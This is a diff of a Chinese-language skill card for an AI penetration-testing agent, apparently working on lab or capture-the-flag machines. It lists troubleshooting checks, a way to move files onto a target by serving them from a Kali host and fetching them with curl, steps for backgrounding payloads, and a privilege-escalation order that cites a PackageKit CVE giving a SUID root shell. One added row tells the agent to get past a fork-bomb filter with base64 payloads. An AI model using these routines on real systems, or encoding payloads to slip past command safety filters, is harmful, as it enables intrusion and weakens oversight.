@@ -1,25 +1,24 @@
 ---
 name: 'blocking-points-detail'
-description: '阻断点细节归档：三问检查表/验证SOP/文件传输/提权优先级路由（按需读取）'
-disable-model-invocation: true
+description: '阻断点细节归档：三问检查表/验证SOP/文件传输/提权优先级路由（AGENTS.md 精简后按需读取）（检索词：blocking/stuck/checklist/sop/file-transfer/file transfer/points/detail）'
 metadata: { domain: meta, tier: T2 }
 ---
-> 📌 DSH 用法：用 skill 工具按名加载本卡。
+> 📌 DSH 适配：本技能移植自 RS。原 read_skill/run_skill 调用 = 用 DSH 的 skill 工具按名加载对应技能；fleet/kali-mcp = 用 bash 后台任务与 subagent 工具实现。
 
 # 阻断点细节：三问检查 / 文件传输 / 提权优先级路由
 
-> 高频查表/流程细节按需加载：T1 卡只留骨架指针，卡点详情查这里。
+> AGENTS.md 精简后归档的详细内容。AGENTS.md 只留骨架，卡点详情查这里。
 
 ## 阻断点 3：方向对但操作不通 → 三问检查
 
 ### 第一问：触发机制 — 我读了这个脚本的加载逻辑吗？
-```text
+```
 🔴 文件上传/写入 → 目标服务怎么加载它？
    → cron 轮询? inotify? systemd path unit? 手动触发?
    → 文件名有格式要求吗? (pickle 必须匹配特定文件名)
    → 加载有延迟吗? (30 秒轮询 → 等够时间?)
 做法: find / -name "*.py" -o -name "*.sh" -o -name "*.service" | xargs grep -l "watch|poll|inotify|load"
-```text
+```
 | 陷阱 | 信号 | 检查 |
 |------|------|------|
 | 文件名精确匹配 | `glob("*.pickle")` / `open("固定名")` | 读脚本确认 |
@@ -39,6 +38,7 @@ metadata: { domain: meta, tier: T2 }
 | socat | 默认无 PTY | `file:$(tty),raw,echo=0` |
 | ssh | 严格 host key | `-o StrictHostKeyChecking=no` |
 | evil-winrm | `\` 转义 | 用 `/` 或 `\\` |
+| ~~本地 bash 嵌套 JSON~~ | ✅ **已修复** (2026-08-02): 根因是 kali_server.py fork-bomb 正则 `r':()s*{'` 误匹配 JSON 的 `":{` → 400 → 被吞成 "Request failed"。已改为精确正则 `r':\s*\(\s*\)\s*\{'`，JSON 不再误杀，真 fork bomb 仍拦截。若旧实例未重启仍有此问题 → base64 payload | 修改文件: `~/MCP-Kali-Server-security/kali_server.py` + Windows 副本 |
 
 ### 第三问：系统规则 — sudo/cron/systemd 隐式约束？
 | 陷阱 | 信号 | 检查 |
@@ -55,66 +55,65 @@ metadata: { domain: meta, tier: T2 }
 ## 阻断点 3.6：验证 SOP（Browsed 教训 — 防假阴性）
 
 ### 成功判定标准先行
-```text
+```
 🔴 发起利用前写死"成功=可观测副作用"，只按它判定:
    注入 = touch 文件存在 / RCE = out.txt 非空 / 盲打 = 定时回连
    "没看到结果" ≠ 失败（可能是 cwd/回显/路由问题）— 先查环境再判
-```text
+```
 
 ### 验证前确认执行上下文
-```text
+```
 🔴 副作用验证前先跑无害命令: pwd && id && ls（确认上下文）
    cwd 不对 = 假阴性（Browsed: 注入写文件失败是 cwd 不在 markdownPreview）
-```text
+```
 
 ### payload 双环境预检
-```text
+```
 🔴 先在 Kali 本地验证语法（bash -n / python -c / JSON 校验）→ 再打靶机
    区分"语法错误" vs "靶机拒绝" — 两者处理完全不同
-```text
+```
 
 ### 错误信息解读 SOP（替代无脑重试）
-```text
+```
 🔴 每个错误输出回答: "这个错误告诉我什么？" → 再决定下一步
    404           → 路由/路径问题（不是"没执行"）
    Request failed → 先查 detail 字段（mcp_server 已带 detail）
    Permission denied → 身份/权限问题（不是"命令错了"）
    HTTP 000 / timeout → 网络/服务挂（不是 payload 错）
 🔴 同一命令重试 ≥3 次 → 必须换解读，禁止盲试
-```text
+```
 
 ## 阻断点 3.5：文件传输 & 长脚本执行（Cohort 实战沉淀）
 
-> 本地 bash bash 工具 有传输长度限制（Command too long）；PTY 里多行 heredoc 卡死。
+> 本地 bash/pwsh 工具有传输长度限制（Command too long）；PTY 里多行 heredoc 卡死。
+> （⚠️ `execute_command` 是 RS 时代工具名，本 harness 是 pwsh / bash）
 
 ### 传输（靶机无外网时）
-```text
+```
 [1] Kali 起 HTTP: nohup python3 -m http.server <PORT> --directory /tmp >/dev/null 2>&1 &
 [2] 靶机下载: curl -s -o /tmp/x http://KALI_IP:PORT/x
-[3] 短文件 (<2KB): bash 工具 stdin 传 base64 → echo '<b64>' | base64 -d > /tmp/x
-```text
+[3] 短文件 (<2KB): pwsh/bash 传 base64 → echo '<b64>' | base64 -d > /tmp/x
+```
 
 ### 执行
-```text
+```
 🔴 长任务一律: nohup python3 -u /tmp/x.py > /tmp/out.txt 2>&1 & → 轮询 cat
    (python 必须 -u，否则 stdout 块缓冲，重定向文件永远 0 字节)
 🔴 交互式程序: python 脚本驱动交互通道 (websocket/pty)，发命令→sleep→读响应循环
 🔴 二进制 Permission denied → noexec → cp 到 ~/ 或 /dev/shm
 🔴 后台任务: nohup + 输出重定向，避免 PTY 退出杀死子进程
-```text
+```
 
 ### 反模式
-```text
-❌ 多行 heredoc (cat >> f << 'EOF') → PTY 卡死
-❌ 单命令超传输限制 → MCP Command too long → base64 分块
-❌ 前台跑 >30s → MCP Request failed → nohup 后台化
-❌ 同脚本多实例并发 → 目标服务连接上限挂起 → 先 pkill
-❌ pkill -f <模式> 自杀: 延迟重启脚本命令行含同样模式会被自己 pkill 掉 → 用锚定 pgrep -f "^完整命令$" 取 PID 再 kill
-```text
+
+> 🔴 **通用操作红线已移出本卡** → `command-safety-red-lines`（T1，**开局加载**）。
+> 移出原因：那几条（`pkill -f` 自杀 / heredoc 卡死 PTY / 前台 >30s 超时 / 传输长度限制 /
+> 同脚本并发）**一次就能造成事故**，而本卡是 T2、按需加载 —— 结果是"**事故先于卡到达**"。
+> 此处不再重复，避免两份漂移；传输/执行细节仍在上面两节。
 
 ## 提权优先级路由（Cohort 教训）
 
-```text
+```
 [1] 用户态 root 服务 (D-Bus activatable + dpkg 版本审计) ← 最容易遗漏！
     → busctl list + dpkg -l 补丁级别 → 搜 "<服务> <版本> CVE 2026"
     → 案例: PackageKit 1.2.8-2ubuntu1.2 → CVE-2026-41651 Pack2TheRoot → SUID bash
@@ -122,10 +121,10 @@ metadata: { domain: meta, tier: T2 }
 [3] 内核 CVE（最后 — 现代靶机通常已缓解/修复）
     → ls /etc/modprobe.d/disable-*.conf（存在 = 已知内核 CVE 已缓解）
     → unprivileged_userns_clone=0 → 需 userns 的内核漏洞不可用
-    → 内核版本对比: 发行版 security 页面修复版本（2026 LPE 清单见本机笔记）
+    → 内核版本对比: 发行版 security 页面修复版本（2026 LPE 清单见 `linux-privesc`）
 🔴 "内核全锁死" ≠ 提权结束 → 切回 [1] 用户态服务面
 🔴 部分升级 (同包族 lib 新 daemon 旧) = 漏洞窗口信号
-```text
+```
 
-**Why:** 高频查表/流程细节保留在这张深卡里，按需读取比全量加载省上下文。
-**How to apply:** 遇到"操作不通/文件传不上/提权选路"时按名加载本卡；T1 卡只留指针。
+**Why:** AGENTS.md 精简（615→骨架）后，这些高频查表/流程细节仍需保留，按需读取比全量加载省上下文。
+**How to apply:** 遇到"操作不通/文件传不上/提权选路"时查本 memory；AGENTS.md 阻断点 1/3/3.5 只留指针。
